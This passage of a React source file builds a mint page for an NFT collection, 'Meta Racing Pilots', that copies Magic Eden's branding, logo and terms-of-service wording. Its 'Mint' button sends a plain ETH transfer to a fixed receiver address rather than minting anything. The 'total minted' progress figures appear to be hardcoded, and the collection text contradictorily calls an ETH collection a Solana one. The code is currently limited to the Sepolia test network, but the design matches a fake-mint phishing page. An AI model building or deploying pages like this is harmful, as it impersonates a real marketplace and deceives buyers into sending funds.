          });
        } else {
          throw switchError;
        }
      }
      await refreshNetwork();
    } catch (e) {
      setError(e?.message ?? String(e));
    }
  };

  const buy = async () => {
    try {
      setError(null);
      setTxHash(null);
      setStatus("idle");

      if (!window.ethereum) throw new Error("Wallet не найден.");
      if (!account) throw new Error("Сначала нажми Log In.");
      if (!accepted) throw new Error("Нужно принять Terms (checkbox).");

      const provider = new BrowserProvider(window.ethereum);
      const network = await provider.getNetwork();
      setChainId(network.chainId);

      if (network.chainId !== SEPOLIA_CHAIN_ID_DEC) {
        throw new Error("Неверная сеть. Переключись на Sepolia (тест).");
      }

      const signer = await provider.getSigner();

      setStatus("sending");
      const tx = await signer.sendTransaction({
        to: RECEIVER,
        value: totalWei,
        gasLimit: 21000n,
      });

      setTxHash(tx.hash);
      await tx.wait();
      setStatus("success");
    } catch (e) {
      setStatus("idle");
      setError(e?.shortMessage ?? e?.message ?? String(e));
    }
  };

  const isSepolia = chainId === SEPOLIA_CHAIN_ID_DEC;

  const mintFeeEth = useMemo(() => (0.003 * (Number(qty) || 0)).toFixed(3), [qty]);
  const protocolFeeEth = useMemo(() => (0.0014 * (Number(qty) || 0)).toFixed(4), [qty]);

  const canMint = !!account && isSepolia && accepted && status !== "sending";

  const MintPanel = ({ mobile = false }) => (
    <div className={`panel ${mobile ? "panelMobile" : ""}`}>
      <div className="panelInner">
        <div className="metaRow">
          <div className="metaLeft">
            <div className="metaLine">
              <div className="eligPill">
                {!eligible && <span className="lockIcon">🔒</span>}
                {eligible ? "Eligible" : "Not Eligible"}
              </div>

              <div className="publicRow">
                <span className="greenDot" />
                <span>Public</span>
              </div>
            </div>
          </div>

          <div className="mintedBox">
            <div className="mintedHeader">
              <div className="mintedTop">Total minted</div>
              <div className="mintedNums">
                {TOTAL_MINTED_PERCENT}%&nbsp;&nbsp; {TOTAL_MINTED} / {TOTAL_SUPPLY}
              </div>
            </div>

            <div className="mintedBar" aria-label="minted progress" style={{ ["--pct"]: `${TOTAL_MINTED_PERCENT}%` }}>
              <div className="mintedFill" />
            </div>
          </div>
        </div>

        <div className="rowTop">
          <div className="priceBlock">
            <div className="label">Price</div>
            <div className="priceLine">
              <div className="priceBig">{PRICE_PER_ITEM_ETH} ETH</div>
              <div className="usd">(test)</div>
            </div>
          </div>

          <div className="stepper">
            <button className="stepBtn" onClick={() => setQty((v) => Math.max(1, Number(v) - 1))} disabled={qty <= 1}>
              −
            </button>
            <div className="stepVal">{qty}</div>
            <button className="stepBtn" onClick={() => setQty((v) => Math.min(20, Number(v) + 1))} disabled={qty >= 20}>
              +
            </button>
          </div>
        </div>

        <div className="fees">
          <div>Mint fee</div>
          <div className="r">{mintFeeEth} ETH</div>

          <div>Protocol fee</div>
          <div className="r">{protocolFeeEth} ETH</div>

          <div>
            Priority fee <span className="smallLink">(Standard)</span>
          </div>
          <div className="r">—</div>

          <div style={{ marginTop: 6, color: "rgb(var(--textColor-secondary) / .85)" }}>Subtotal</div>
          <div style={{ marginTop: 6 }} className="r">
            {formatEther(totalWei)} ETH
          </div>
        </div>

        <div className="terms">
          <input className="cb" type="checkbox" checked={accepted} onChange={(e) => setAccepted(e.target.checked)} />
          <div>
            By clicking "mint", you agree to the Magic Eden Terms of Service.
            <div style={{ marginTop: 6, color: "rgb(var(--textColor-secondary) / .85)" }}>
              Network:{" "}
              {isSepolia ? (
                <b style={{ color: "rgb(var(--textColor-primary) / .92)" }}>Sepolia</b>
              ) : (
                <b style={{ color: "rgb(var(--textColor-attention))" }}>Wrong / Not Sepolia</b>
              )}
              {!isSepolia && (
                <button
                  className="btnSecondary"
                  style={{ padding: "0 10px", marginLeft: 8, height: 34 }}
                  onClick={switchToSepolia}
                >
                  Switch to Sepolia
                </button>
              )}
            </div>
          </div>
        </div>

        <button
          className={`primaryCta ${account ? "" : "notBold"}`}
          onClick={account ? buy : connect}
          disabled={account ? !canMint : status === "sending"}
        >
          {account ? (status === "sending" ? "Confirming…" : "Mint") : "Log In to mint"}
        </button>

        <div className="noticeLock">
          <span style={{ color: "rgb(var(--brand) / .90)" }}>🔒</span>
          <span>Collection is locked from trading until all items have been minted.</span>
        </div>

        {txHash && (
          <div className="txBox">
            <div>
              Tx: <span style={{ fontFamily: "var(--mono)" }}>{shortAddr(txHash)}</span>
            </div>
            <a href={`https://sepolia.etherscan.io/tx/${txHash}`} target="_blank" rel="noreferrer">
              View on Etherscan →
            </a>
          </div>
        )}

        {error && <div className="err">{error}</div>}
      </div>
    </div>
  );

  // ===== Navbar render (strict per device) =====
  const renderDesktop = () => (
    <>
      <div className="navLinks" aria-label="Primary navigation">
        <span className="navLink">Play</span>
        <span className="navLink">Trade</span>
        <span className="navLink">Mint</span>
      </div>

      <div className="navSearch">
        <div className="searchWrap" role="search">
          <div className="searchLeft" aria-hidden="true">
            <SearchIcon />
          </div>
          <input className="searchInput" placeholder="Search collections" />
          <div className="searchRight" aria-hidden="true">
            <div className="kbd">
              <span className="kbdKey">Ctrl</span>
              <span className="kbdKey">K</span>
            </div>
          </div>
        </div>
      </div>

      <div className="navRight">
        <button className="btnSecondary">Buybacks</button>
        <button className="btnSecondary">Rewards</button>
        <button className="btnPrimary" onClick={connect}>
          {account ? shortAddr(account) : "Log In"}
        </button>
      </div>
    </>
  );

  const renderTablet = () => (
    <>
      {/* no Play/Trade/Mint in topbar */}
      <div className="navSearch" style={{ paddingLeft: 12, paddingRight: 12 }}>
        <div className="searchWrap" role="search">
          <div className="searchLeft" aria-hidden="true">
            <SearchIcon />
          </div>
          <input className="searchInput" placeholder="Search collections" />
          {/* on tablet убираем Ctrl+K, чтобы не жрало место */}
          <div className="searchRight" aria-hidden="true" style={{ paddingRight: 10, opacity: 0.0 }} />
        </div>
      </div>

      <div className="navRight">
        <button className="btnSecondary">Buybacks</button>
        <button className="btnSecondary">Rewards</button>
        <button className="btnPrimary" onClick={connect}>
          {account ? shortAddr(account) : "Log In"}
        </button>
        <button className="iconBtn" onClick={() => setMenuOpen((v) => !v)} aria-label="Menu" title="Menu">
          ☰
        </button>
      </div>
    </>
  );

  const renderMobile = () => (
    <>
      {/* no links + no full search + no buybacks/rewards */}
      <div className="navRight">
        <button
            className="iconGhost"
            aria-label="Search"
            title="Search"
            onClick={() => setSearchRowOpen((v) => !v)}
        >
          <SearchIcon/>
        </button>

        <button className={`btnPrimary btnPrimaryMobile`} onClick={connect}>
          {account ? shortAddr(account) : "Log In"}
        </button>

        <button
          className="iconBtn iconBtnSmall"
          onClick={() => setMenuOpen((v) => !v)}
          aria-label="Menu"
          title="Menu"
        >
          ☰
        </button>
      </div>
    </>
  );

  return (
    <div className="page">
      <style>{CSS}</style>

      {/* NAVBAR */}
      <div className="header" id="header">
        <header className="headerBar">
          <nav className="nav" id="nav">
            <div className="navLeft">
              <a className="logoWrap" href="#" aria-label="Magic Eden">
                <MagicEdenLogo />
              </a>
            </div>

            {isDesktop && renderDesktop()}
            {isTablet && renderTablet()}
            {isMobile && renderMobile()}
          </nav>
        </header>

        {/* Mobile: search row toggled by icon */}
        {isMobile && searchRowOpen && (
          <div className="mobileSearchRow">
            <div className="mobileSearchWrap">
              <input className="mobileSearchInput" placeholder="Search collections (UI only)" />
            </div>
          </div>
        )}

        {/* Burger menu:
            - Tablet: Play/Trade/Mint (и всё остальное)
            - Mobile: Play/Trade/Mint + Buybacks/Rewards (потому что они скрыты сверху)
        */}
        {menuOpen && (isTablet || isMobile) && (
          <div className="mobileMenu">
            <button className="mobileItem">Play</button>
            <button className="mobileItem">Trade</button>
            <button className="mobileItem">Mint</button>

            {isMobile && (
              <>
                <button className="mobileItem">Buybacks</button>
                <button className="mobileItem">Rewards</button>
              </>
            )}
          </div>
        )}
      </div>

      <div className="shell">
        <div className="heroRow">
          <div className="heroLeft">
            <div className="chainBadge">ETH</div>
            <div className="title">Meta Racing Pilots</div>
          </div>

          <div className="heroRight">
            <button className="btnSecondary" style={{ height: 44, borderRadius: 10 }}>
              Contract
            </button>
            <div className="heroIcons">
              <button className="iconBtn" title="Website">
                🌐
              </button>
              <button className="iconBtn" title="X">
                X
              </button>
              <button className="iconBtn" title="Discord">
                DS
              </button>
            </div>
          </div>
        </div>

        <div className="mainGrid">
          {/* LEFT */}
          <div className="mediaCard">
            <div className="mediaWrap">
              <div className="mediaMain">
                <img src={IMAGES[activeThumb]} alt="Preview" className="mainImg" />
                <div className="fullscreen" title="Fullscreen">
                  ⤢
                </div>
              </div>

              <div className="thumbRow">
                {IMAGES.map((src, i) => (
                  <button
                    key={src}
                    type="button"
                    className={`thumbBtn ${activeThumb === i ? "active" : ""}`}
                    onClick={() => setActiveThumb(i)}
                    title="Preview"
                  >
                    <img src={src} alt={`Thumb ${i + 1}`} className="thumbImg" />
                  </button>
                ))}
              </div>
            </div>

            {/* MOBILE: после картинок идет mint */}
            <div className="mintMobile">
              <MintPanel mobile />
            </div>

            {/* DESCRIPTION */}
            <div className="descWrap">
              <div className="layerBox">
                <div className="layerBoxInner">
                  <div className="sectionTitle">Overview</div>

                  <p className="p">
                    Meta Racing Pilots is a playable PFP NFT collection where each Pilot defines race strategy and
                    enhances car performance. A Pilot is a necessary asset for entering races and plays a key role in
                    determining the outcome of every competition.
                  </p>

                  <p className="p">
                    <span className="brandStrong">The Role of Pilots in Gameplay</span>
                  </p>

                  <p className="p">In Meta Racing, the Pilot acts as the strategic core of each race:</p>
                  <ol className="list">
                    <li className="li">Determines strategic buffs and performance boosts during races</li>
                    <li className="li">Significantly influences the car’s overall performance</li>
                    <li className="li">Required to participate in any race</li>
                  </ol>

                  <p className="p">Without a Pilot, cars cannot enter the track, making each Pilot essential to gameplay.</p>

                  <p className="p">
                    <span className="brandStrong">RPG Progression &amp; Custom Builds</span>
                  </p>

                  <p className="p">Every Pilot is unique and develops through an RPG-style progression system:</p>
                  <ol className="list">
                    <li className="li">Free allocation of skill points to create custom builds</li>
                    <li className="li">Multiple strategic paths depending on playstyle</li>
                    <li className="li">Progression through races or a dedicated in-game academy</li>
                  </ol>

                  <p className="p">
                    Pilot rarity defines starting attributes and the maximum progression cap, giving each Pilot a distinct
                    long-term gameplay role.
                  </p>

                  <p className="p">
                    <span className="brandStrong">Flexible Usage &amp; Team Play</span>
                  </p>

                  <p className="p">Pilots can be used in multiple ways within the Meta Racing ecosystem:</p>
                  <ol className="list">
                    <li className="li">Actively race and develop Pilots through gameplay</li>
                    <li className="li">Build balanced teams for different race formats</li>
                    <li className="li">Make Pilots available to other players when not in use</li>
                  </ol>

                  <p className="p">This flexibility supports a dynamic and evolving in-game environment.</p>

                  <p className="p">
                    <span className="brandStrong">The Meta Racing Ecosystem</span>
                  </p>

                  <p className="p">
                    The Meta Racing Pilots collection is built on The chain Solana and is available on an NFT marketplace,
                    enabling fast transactions and easy access. Minting a Pilot is the first step toward shaping your racing
                    strategy, developing your team, and progressing in the competitive world of Meta Racing.
                  </p>

                  <div className="h3">Utility</div>
                  <ol className="list">
                    <li className="li">
                      <span className="brandStrong">Necessary Gameplay Asset:</span> A Pilot is required to enter any race in
                      Meta Racing and earn in races and tournaments
                    </li>
                    <li className="li">
                      <span className="brandStrong">Performance Boosts:</span> Pilots provide in-race buffs and attribute
                      modifiers that directly affect car performance and races outcomes.
                    </li>
                    <li className="li">
                      <span className="brandStrong">RPG-Style Progression System:</span> Each Pilot can be upgraded with players
                      freely allocating skill points to create custom builds and strategies.
                    </li>
                    <li className="li">
                      <span className="brandStrong">Rarity-Based Progression Depth:</span> Pilot rarity defines starting
                      attributes and the maximum progression cap
                    </li>
                    <li className="li">
                      <span className="brandStrong">Team &amp; Roster Building:</span> Players can assemble balanced teams of
                      Pilots optimized for different tracks, race formats, and strategic scenarios.
                    </li>
                    <li className="li">
                      <span className="brandStrong">Passive Utility via Rental:</span> When not actively racing, Pilots can be
                      made available for use by other players, allowing owners to receive in-game token rewards.
                    </li>
                    <li className="li">
                      <span className="brandStrong">3+ NFT Pilots Holders:</span> 3+ NFT Pilots Holders will receive a free Car
                      NFT on the game release.
                    </li>
                    <li className="li">
                      <span className="brandStrong">PFP:</span> Pilots are cool pfp and community NFT
                    </li>
                  </ol>

                  <div className="divider" />

                  <div className="sectionTitle">Meet the team</div>
                  <div className="teamGrid">
                    {TEAM.map((m) => (
                      <div key={m.name} className="teamCard">
                        <div className="teamImgWrap">
                          <img className="teamImg" src={m.img} alt={`${m.name} image`} />
                        </div>
                        <div className="teamBody">
                          <div>
                            <div className="teamName">{m.name}</div>
                            <div className="teamRole">{m.role}</div>
                          </div>
                          <div className="teamLinks">
                            {m.x ? (
                              <a
                                className="xLink"
                                href={m.x}
                                target="_blank"
                                rel="noopener noreferrer"
                                aria-label={`${m.name} on X`}
                                title="X"
                              >
                                <XIcon />
                              </a>
                            ) : (
                              <span style={{ height: 18 }} />
                            )}
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* RIGHT (desktop mint panel) */}
          <div className="rightCol mintDesktop">
            <MintPanel />
          </div>
        </div>
      </div>
    </div>
  );
}
